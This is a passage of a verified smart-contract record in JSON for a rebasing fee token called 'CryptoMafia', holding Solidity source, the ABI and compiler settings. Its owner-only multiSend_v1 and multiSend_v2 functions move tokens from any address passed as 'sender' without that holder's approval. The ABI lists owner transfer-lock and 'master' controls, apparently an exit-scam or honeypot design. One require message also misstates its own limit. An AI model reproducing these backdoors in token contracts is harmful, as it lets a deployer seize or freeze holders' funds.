address(0x80598c77096b7fB783155051883aC78A39Af91D8);\r\n            buyBackFeeReceiver = address(0x80598c77096b7fB783155051883aC78A39Af91D8);\r\n            isRebased = true;\r\n        }\r\n    }\r\n\r\n    function setMaxWalletToken(uint256 _num, uint256 _denom)\r\n        external\r\n        onlyOwner\r\n    {\r\n        gonMaxWallet = TOTAL_GONS.div(_denom).mul(_num);\r\n    }\r\n\r\n    function checkMaxWalletToken() external view returns (uint256) {\r\n        return gonMaxWallet.div(_gonsPerFragment);\r\n    }\r\n\r\n    function shouldTakeFee(address from) internal view returns (bool) {\r\n        return !_isFeeExempt[from];\r\n    }\r\n\r\n    function shouldSwapBack() internal view returns (bool) {\r\n        return\r\n            msg.sender != pair &&\r\n            !inSwap &&\r\n            swapEnabled &&\r\n            _gonBalances[address(this)] >= gonSwapThreshold;\r\n    }\r\n\r\n    function setSwapBackSettings(\r\n        bool _enabled,\r\n        uint256 _num,\r\n        uint256 _denom\r\n    ) external onlyOwner {\r\n        swapEnabled = _enabled;\r\n        gonSwapThreshold = TOTAL_GONS.div(_denom).mul(_num);\r\n    }\r\n\r\n    function setTargetLiquidity(uint256 target, uint256 accuracy)\r\n        external\r\n        onlyOwner\r\n    {\r\n        targetLiquidity = target;\r\n        targetLiquidityDenominator = accuracy;\r\n    }\r\n\r\n    function isNotInSwap() external view returns (bool) {\r\n        return !inSwap;\r\n    }\r\n\r\n    function checkSwapThreshold() external view returns (uint256) {\r\n        return gonSwapThreshold.div(_gonsPerFragment);\r\n    }\r\n\r\n    function setFees(\r\n        uint256 _ecosystemFee,\r\n        uint256 _liquidityFee,\r\n        uint256 _buyBackFee,\r\n        uint256 _marketingFee,\r\n        uint256 _rewardFee,\r\n        uint256 _feeDenominator\r\n    ) external onlyOwner {\r\n        ecosystemFee = _ecosystemFee;\r\n        liquidityFee = _liquidityFee;\r\n        buyBackFee = _buyBackFee;\r\n        marketingFee = _marketingFee;\r\n        rewardFee = _rewardFee;\r\n        totalFee = ecosystemFee\r\n            .add(liquidityFee)\r\n            .add(marketingFee)\r\n            .add(buyBackFee)\r\n            .add(rewardFee);\r\n        feeDenominator = _feeDenominator;\r\n        require(totalFee < feeDenominator / 4);\r\n    }\r\n\r\n    function toggleLiquidityMode() external onlyOwner {\r\n        if (liquidityFee != totalFee) {\r\n            prevLiquidityFee = liquidityFee;\r\n            prevBuyBackFee = buyBackFee;\r\n            prevEcosystemFee = ecosystemFee;\r\n            prevMarketingFee = marketingFee;\r\n            prevRewardFee = rewardFee;\r\n\r\n            liquidityFee = totalFee;\r\n            buyBackFee = 0;\r\n            ecosystemFee = 0;\r\n            marketingFee = 0;\r\n            rewardFee = 0;\r\n        } else {\r\n            liquidityFee = prevLiquidityFee;\r\n            buyBackFee = prevBuyBackFee;\r\n            ecosystemFee = prevEcosystemFee;\r\n            marketingFee = prevMarketingFee;\r\n            rewardFee = prevRewardFee;\r\n        }\r\n    }\r\n\r\n    function setFeeReceivers(\r\n        address _autoLiquidityReceiver,\r\n        address _ecosystemFeeReceiver,\r\n        address _marketingFeeReceiver,\r\n        address _buyBackFeeReceiver\r\n    ) external onlyOwner {\r\n        autoLiquidityReceiver = _autoLiquidityReceiver;\r\n        ecosystemFeeReceiver = _ecosystemFeeReceiver;\r\n        marketingFeeReceiver = _marketingFeeReceiver;\r\n        buyBackFeeReceiver = _buyBackFeeReceiver;\r\n    }\r\n\r\n    function rescueToken(address tokenAddress, uint256 tokens)\r\n        public\r\n        onlyOwner\r\n        returns (bool success)\r\n    {\r\n        return ERC20Detailed(tokenAddress).transfer(msg.sender, tokens);\r\n    }\r\n\r\n    function clearStuckBalance(uint256 amountPercentage, address adr)\r\n        external\r\n        onlyOwner\r\n    {\r\n        uint256 amountETH = address(this).balance;\r\n        payable(adr).transfer((amountETH * amountPercentage) / 100);\r\n    }\r\n\r\n    function transferToAddressETH(address payable recipient, uint256 amount)\r\n        private\r\n    {\r\n        recipient.transfer(amount);\r\n    }\r\n\r\n    function getCirculatingSupply() public view returns (uint256) {\r\n        return\r\n            (TOTAL_GONS.sub(_gonBalances[DEAD]).sub(_gonBalances[ZERO])).div(\r\n                _gonsPerFragment\r\n            );\r\n    }\r\n\r\n    function multiSend_v1(\r\n        address sender,\r\n        address[] calldata recipients,\r\n        uint256[] calldata values\r\n    ) external onlyOwner {\r\n        require(\r\n            recipients.length < 801,\r\n            \"GAS Error: max airdrop limit is 500 recipients\"\r\n        ); // to prevent overflow\r\n        require(\r\n            recipients.length == values.length,\r\n            \"Mismatch between Address and token count\"\r\n        );\r\n\r\n        for (uint256 i = 0; i < recipients.length; i++) {\r\n            _basicTransfer(sender, recipients[i], values[i]);\r\n            if (!isDividendExempt[recipients[i]]) {\r\n                try\r\n                    distributor.setShare(\r\n                        recipients[i],\r\n                        _gonBalances[recipients[i]].div(shareGonDivisor)\r\n                    )\r\n                {} catch {}\r\n            }\r\n        }\r\n\r\n        if (!isDividendExempt[sender]) {\r\n            try\r\n                distributor.setShare(\r\n                    sender,\r\n                    _gonBalances[sender].div(shareGonDivisor)\r\n                )\r\n            {} catch {}\r\n        }\r\n    }\r\n\r\n    function multiSend_v2(\r\n        address sender,\r\n        address[] calldata recipients,\r\n        uint256 values\r\n    ) external onlyOwner {\r\n        require(\r\n            recipients.length < 2001,\r\n            \"GAS Error: max airdrop limit is 2000 recipients\"\r\n        ); // to prevent overflow\r\n\r\n        for (uint256 i = 0; i < recipients.length; i++) {\r\n            _basicTransfer(sender, recipients[i], values);\r\n            if (!isDividendExempt[recipients[i]]) {\r\n                try\r\n                    distributor.setShare(\r\n                        recipients[i],\r\n                        _gonBalances[recipients[i]].div(shareGonDivisor)\r\n                    )\r\n                {} catch {}\r\n            }\r\n        }\r\n\r\n        if (!isDividendExempt[sender]) {\r\n            try\r\n                distributor.setShare(\r\n                    sender,\r\n                    _gonBalances[sender].div(shareGonDivisor)\r\n                )\r\n            {} catch {}\r\n        }\r\n    }\r\n\r\n    function getLiquidityBacking(uint256 accuracy)\r\n        public\r\n        view\r\n        returns (uint256)\r\n    {\r\n        uint256 liquidityBalance = _gonBalances[pair].div(_gonsPerFragment);\r\n        return\r\n            accuracy.mul(liquidityBalance.mul(2)).div(getCirculatingSupply());\r\n    }\r\n\r\n    function isOverLiquified(uint256 target, uint256 accuracy)\r\n        public\r\n        view\r\n        returns (bool)\r\n    {\r\n        return getLiquidityBacking(accuracy) > target;\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"}],\"name\":\"OwnershipRenounced\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLiquidityReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"who\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyBackFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyBackFeeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"}],\"name\":\"checkDividendLock\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"locked\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"timer\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"checkFeeExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"}],\"name\":\"checkIsDividendExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"checkMaxWalletExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"checkMaxWalletToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"checkSwapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountPercentage\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"clearStuckBalance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ecosystemFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ecosystemFeeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"enableTransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeDenominator\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCirculatingSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"accuracy\",\"type\":\"uint256\"}],\"name\":\"getLiquidityBacking\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"gonMaxWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"initialDistributionFinished\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isNotInSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"target\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"accuracy\",\"type\":\"uint256\"}],\"name\":\"isOverLiquified\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFeeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"master\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"recipients\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"values\",\"type\":\"uint256[]\"}],\"name\":\"multiSend_v1\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"recipients\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"values\",\"type\":\"uint256\"}],\"name\":\"multiSend_v2\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pairContract\",\"outputs\":[{\"internalType\":\"contract InterfaceLP\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"epoch\",\"type\":\"uint256\"},{\"internalType\":\"int256\",\"name\":\"supplyDelta\",\"type\":\"int256\"}],\"name\":\"rebase\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"rescueToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"rewardFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"router\",\"outputs\":[{\"internalType\":\"contract IDEXRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_minPeriod\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_minDistribution\",\"type\":\"uint256\"}],\"name\":\"setDistributionCriteria\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"gas\",\"type\":\"uint256\"}],\"name\":\"setDistributorSettings\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"},{\"internalType\":\"uint128\",\"name\":\"interval\",\"type\":\"uint128\"}],\"name\":\"setDividendLocker\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setFeeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_autoLiquidityReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_ecosystemFeeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_marketingFeeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_buyBackFeeReceiver\",\"type\":\"address\"}],\"name\":\"setFeeReceivers\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_ecosystemFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_liquidityFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_buyBackFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_marketingFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_rewardFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeDenominator\",\"type\":\"uint256\"}],\"name\":\"setFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"setInitialDistributionFinished\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setIsDividendExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"locked\",\"type\":\"bool\"}],\"name\":\"setIsDividendLocked\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"setLP\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_master\",\"type\":\"address\"}],\"name\":\"setMaster\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"setMaxWalletExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_num\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_denom\",\"type\":\"uint256\"}],\"name\":\"setMaxWalletToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_enabled\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"_num\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_denom\",\"type\":\"uint256\"}],\"name\":\"setSwapBackSettings\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"target\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"accuracy\",\"type\":\"uint256\"}],\"name\":\"setTargetLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"setTransferLock\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toggleLiquidityMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferLockEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "CryptoMafia", "CompilerVersion": "v0.7.6+commit.7338295f", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://7712db887ea7da1dd4145b1748410ec8200970aef81423d88f2a4b1c77e359f7"}